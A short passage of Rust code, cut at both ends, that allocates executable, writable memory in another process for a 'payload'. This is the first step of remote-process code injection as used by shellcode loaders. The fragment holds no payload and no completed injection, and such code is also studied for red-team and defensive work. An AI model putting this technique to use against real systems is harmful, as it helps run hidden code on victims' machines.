 }
 let h_process = h_process.unwrap();

 let remote_mem = VirtualAllocEx(
 h_process,
 None,
 payload.len(),
 MEM_COMMIT | MEM_RESERVE,
 PAGE_EXECUTE_READWRITE,
 );
 if remote_mem.is_null() {
